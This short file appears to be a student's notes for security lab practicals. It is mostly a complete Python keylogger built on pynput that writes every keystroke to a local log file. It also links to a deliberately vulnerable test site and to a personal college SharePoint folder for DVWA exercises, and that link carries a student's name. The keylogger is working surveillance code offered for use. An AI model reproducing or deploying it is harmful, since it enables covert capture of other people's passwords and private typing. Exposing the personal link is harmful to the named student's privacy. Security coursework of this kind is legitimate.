# osmf
##keylogger code

from pynput import keyboard as k

def log_write(data):
    with open("keylog.log", "a") as file:
        file.write(str(data))


def write(key):
    if str(key) == "key.esc":
        print("Keylogger stopped")
        return False

    try:
        log_write(str(key.char))
    except Exception:
        log_write("\n" + str(key) + "\n")
        return


log_write("\nNew session Started\n")

with k.Listener(on_release=write) as l:
    l.join()


##for wireshark
https://testasp.vulnweb.com/ 

##for 7,8,9 pracs dvwa

https://birlacollege-my.sharepoint.com/:f:/g/personal/kiara_sangtani_bkbck_edu_in/IgBqWySK7N-mSZ0fdMhihYbkAc8Ta-ECcb0Lc-IcEkSIfNY?e=V25Nqv
